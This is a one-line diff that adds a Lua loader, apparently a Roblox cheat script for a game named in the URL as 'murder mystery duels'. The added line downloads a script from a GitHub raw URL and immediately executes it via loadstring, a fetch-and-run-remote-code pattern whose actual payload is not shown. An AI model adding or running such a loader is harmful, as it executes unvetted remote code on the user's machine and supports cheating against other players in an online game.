@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/murder-mystery-duels-spam3-y1o9b1wwjoldvo.lua"))()
